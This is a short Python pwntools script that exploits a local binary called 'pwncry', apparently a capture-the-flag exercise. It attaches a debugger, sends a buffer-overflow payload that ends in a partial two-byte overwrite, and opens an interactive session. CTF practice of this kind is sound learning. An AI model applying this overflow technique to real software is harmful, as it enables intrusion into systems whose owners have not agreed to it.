from pwn import* 
context.binary=exe=ELF('./pwncry',checksec=False)
p=process(exe.path)

def GDB():
	gdb.attach(p,gdbscript='''\
		b*main+110
		''')
	input()
GDB()
payload=b"A"*(0x408)+b"BBBB"+p32(0)+p64(1)+p16(0xbcf1)
p.sendlineafter(b"> ",b"1")
p.sendafter(b"> ",payload)
p.interactive()